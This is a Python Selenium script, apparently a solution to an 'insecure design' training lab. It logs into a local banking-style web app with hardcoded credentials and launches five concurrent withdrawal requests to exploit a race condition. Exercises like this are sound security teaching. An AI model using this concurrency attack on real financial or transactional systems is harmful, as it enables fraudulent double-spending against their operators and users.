from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from threading import Thread



def bank():
    driver = webdriver.Firefox()
    driver.get("http://192.168.64.9:8000")
    user=driver.find_element(By.ID, "id_username")
    passw=driver.find_element(By.ID, "id_password")
    user.send_keys('kraken')
    passw.send_keys('1nvincibl3')
    btn = driver.find_elements(By.XPATH, "//div[contains(@class, 'text-center')]/button")[0]
    btn.click()
    driver.get("http://192.168.64.9:8000/insecure-design_lab2")
    withdraw=driver.find_element(By.ID, "input")
    withdraw.send_keys(50)
    wbtn=driver.find_element(By.ID, "withdraw")
    wbtn.click()


if __name__ == '__main__':
    Thread(target = bank).start()
    Thread(target = bank).start()
    Thread(target = bank).start()
    Thread(target = bank).start()
    Thread(target = bank).start()



